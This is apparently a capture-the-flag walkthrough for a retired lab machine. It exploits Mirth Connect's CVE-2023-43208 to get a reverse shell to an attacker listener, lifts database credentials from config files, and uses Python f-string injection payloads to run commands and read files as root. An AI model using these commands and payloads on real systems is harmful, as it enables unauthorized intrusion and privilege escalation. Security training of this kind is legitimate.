# Interpreter

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square) ![Released](https://img.shields.io/badge/Released-2026--02--21-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Release** | February 21, 2026 |
| **Rating** | 3.1 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

Mirth Connect 4.4.0 — a healthcare integration engine — is vulnerable to **CVE-2023-43208**, an unauthenticated XStream deserialization RCE, giving a shell as the `mirth` service user. MariaDB credentials in `mirth.properties` unlock the `CHANNEL` table, whose channel configuration reveals an internal Flask app on `127.0.0.1:54321` running as **root**. That app interpolates untrusted XML field values into a Python **f-string**, so `{expression}` syntax inside a field is evaluated as Python code as root — which is both the foothold to root and the name of the box.

---

## Phase 1: Reconnaissance

### Nmap Scan

```bash
nmap -sCV -p- <TARGET_IP>
```

Key ports discovered:
- **22** — OpenSSH
- **80** — HTTP (Jetty — Mirth Connect redirect)
- **443** — HTTPS (Mirth Connect web interface)
- **6661** — TCP Listener (Mirth HL7 MLLP channel)

### Version Fingerprinting

```bash
curl -sk https://<TARGET_IP>/api/server/version -H "X-Requested-With: XMLHttpRequest"
```

**Output:** `4.4.0`

Mirth Connect 4.4.0 is vulnerable to **CVE-2023-43208** — an unauthenticated Remote Code Execution via Java deserialization (XStream).

---

## Phase 2: Initial Foothold — CVE-2023-43208

### Background

CVE-2023-43208 is a bypass of the earlier CVE-2023-37679 fix. Mirth 4.4.0 added a denylist for `ProcessBuilder` in deserialization payloads, but this can be bypassed using an alternative gadget chain:

- `<sorted-set>` → `<dynamic-proxy>` → `EventBindingInvocationHandler` → `ChainedTransformer` → `InvokerTransformer`

### Exploit Setup

The **K3ysTr0K3R** exploit was used because it implements the correct bypass gadget chain (unlike the jakabakos PoC which uses the blocked `ProcessBuilder` chain):

```bash
git clone https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT.git
cd CVE-2023-43208-EXPLOIT
pip3 install alive-progress rich requests --break-system-packages
```

**Patch pwncat dependency** (script tries to import pwncat.manager which isn't needed for basic shells):

```bash
sed -i 's/import pwncat.manager/#import pwncat.manager/' CVE-2023-43208.py
```

### Exploitation

**Terminal 1 — Listener:**
```bash
rlwrap nc -lvnp 9004
```

**Terminal 2 — Exploit:**
```bash
python3 CVE-2023-43208.py -u https://interpreter.htb -lh <ATTACKER_IP> -lp 9004 -bp 9005
```

> **Critical note:** The target URL must use `https://` — the exploit fails over plain HTTP.

**Result:** Reverse shell received as `mirth` user.

### Shell Upgrade

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 50 cols 200
```

---

## Phase 3: Enumeration as mirth

### Users

```bash
cat /etc/passwd | grep sh$
```

```
root:x:0:0:root:/root:/bin/bash
sedric:x:1000:1000:sedric,,,:/home/sedric:/bin/bash
```

`sedric`'s home directory is locked down (`drwx------`), and `sudo` is not installed on the box.

### Network Services

```bash
ss -tlnp
```

```
LISTEN 127.0.0.1:54321    # ← Unknown internal service
LISTEN 127.0.0.1:3306     # ← MariaDB
LISTEN 0.0.0.0:6661       # Mirth HL7 listener
LISTEN 0.0.0.0:443        # Mirth HTTPS
LISTEN 0.0.0.0:80         # Mirth HTTP
LISTEN 0.0.0.0:22         # SSH
```

Two interesting internal-only services: **MariaDB** on 3306 and an **unknown service on port 54321**.

### Database Credentials

```bash
cat /usr/local/mirthconnect/conf/mirth.properties | grep database
```

```
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
database.username = mirthdb
database.password = MirthPass123!
```

### Service Discovery

```bash
systemctl list-units --type=service --state=running
```

Revealed a custom service: `notif.service` — "Notification server"

```bash
cat /etc/systemd/system/notif.service
```

```ini
[Service]
Type=simple
ExecStart=/usr/bin/python3 /usr/local/bin/notif.py
Restart=always
User=root
```

**`notif.py` runs as root!** File permissions: `-rwxr----- root sedric` — only `root` and `sedric` can read it.

### Database Enumeration — Finding the Endpoint

Connected to MariaDB with the discovered credentials:

```bash
mysql -u mirthdb -p'MirthPass123!' mc_bdd_prod -e "SELECT * FROM CHANNEL;"
```

The `CHANNEL` table contained the full Mirth channel XML configuration for **"INTERPRETER - HL7 TO XML TO NOTIFY"**. The critical section in the destination connector revealed:

```xml
<host>http://127.0.0.1:54321/addPatient</host>
<method>post</method>
<content>${message.encodedData}</content>
<contentType>text/plain</contentType>
```

**Key discovery:** The Mirth channel receives HL7 messages on port 6661, transforms them to XML, and POSTs the XML to `http://127.0.0.1:54321/addPatient`.

### Probing the Internal Flask App

The service responded with Werkzeug/2.2.2 headers (Python Flask). Testing the `/addPatient` endpoint:

```bash
python3 << 'EOF'
import requests
xml = '<patient><timestamp>20250101120000</timestamp><sender_app>WEBAPP</sender_app><id>12345</id><firstname>John</firstname><lastname>Doe</lastname><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
r = requests.post('http://127.0.0.1:54321/addPatient', data=xml, headers={'Content-Type':'application/xml'})
print(r.status_code)
print(r.text)
EOF
```

**Output:**
```
200
Patient John Doe (M), 36 years old, received from WEBAPP at 20250101120000
```

The app accepts XML patient data and reflects field values in the response. Date format must be `MM/DD/YYYY`.

---

## Phase 4: Root — Python f-string Injection

### Vulnerability Discovery

The box name "Interpreter" is a hint — the Flask app uses Python's `f-string` formatting (`f"..."`) on the XML input fields. This means `{expression}` syntax inside field values gets **evaluated as Python code** by the interpreter.

### Proof of Concept

```bash
cat > /tmp/pwn.py << 'PYEOF'
import urllib.request

xml = '''<patient>
  <timestamp>20250101120000</timestamp>
  <sender_app>TEST</sender_app>
  <id>12345</id>
  <firstname>{__import__("os").popen("id").read()}</firstname>
  <lastname>Doe</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>'''

req = urllib.request.Request('http://127.0.0.1:54321/addPatient',
                            data=xml.encode('utf-8'),
                            headers={'Content-Type': 'application/xml'})
resp = urllib.request.urlopen(req)
print(resp.read().decode())
PYEOF
python3 /tmp/pwn.py
```

**Output:**
```
Patient uid=0(root) gid=0(root) groups=0(root) Doe (M), 36 years old, received from TEST at 20250101120000
```

**RCE as root confirmed.**

### Flag Exfiltration

```bash
cat > /tmp/flags.py << 'PYEOF'
import urllib.request

xml = '''<patient>
  <timestamp>20250101120000</timestamp>
  <sender_app>TEST</sender_app>
  <id>12345</id>
  <firstname>{open("/home/sedric/user.txt").read()}</firstname>
  <lastname>{open("/root/root.txt").read()}</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>'''

req = urllib.request.Request('http://127.0.0.1:54321/addPatient',
                            data=xml.encode('utf-8'),
                            headers={'Content-Type': 'application/xml'})
resp = urllib.request.urlopen(req)
print(resp.read().decode())
PYEOF
python3 /tmp/flags.py
```

**Output:**
```
Patient [flag redacted] [flag redacted] (M), 36 years old, received from TEST at 20250101120000
```

Both flags come back in the one reflected response.

---

## Lessons Learned

1. **CVE-2023-43208** demonstrates why denylist-based deserialization fixes fail — there are always alternative gadget chains. The jakabakos PoC uses the blocked `ProcessBuilder` chain and fails against 4.4.0; the K3ysTr0K3R exploit uses the correct bypass chain.

2. **Internal service enumeration** (`ss -tlnp`) is critical — the root-level Flask app was only bound to localhost and invisible from external scanning.

3. **Database access** unlocked the attack path — the Mirth channel configuration in the `CHANNEL` table revealed the exact endpoint and XML schema needed to interact with the internal service.

4. **Python f-string injection** is a dangerous but under-discussed vulnerability class. When user input is placed directly into f-strings (e.g., `f"Patient {firstname}..."`), arbitrary Python expressions can be evaluated. Unlike SSTI with `{{}}`, f-string injection uses single braces `{}` and doesn't require a template engine — just Python's built-in string formatting.

5. **The box name is always a hint** — "Interpreter" pointed directly at Python's interpreter evaluating code via f-strings.

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
